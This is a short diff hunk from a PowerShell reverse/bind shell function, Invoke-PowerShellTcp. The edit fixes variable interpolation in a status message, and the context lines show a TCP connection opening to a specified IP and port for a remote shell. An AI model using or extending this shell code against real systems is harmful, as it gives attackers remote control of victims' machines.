@@ -47,7 +47,7 @@ function Invoke-PowerShellTcp {
     try {
         if ($Reverse) {
             # Attempt reverse connection to the specified IP and port
-            Write-Host "Attempting reverse connection to $IPAddress:$Port..."
+            Write-Host "Attempting reverse connection to ${IPAddress}:${Port}..."
             $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
         } elseif ($Bind) {
             # Set up a listener on the specified port
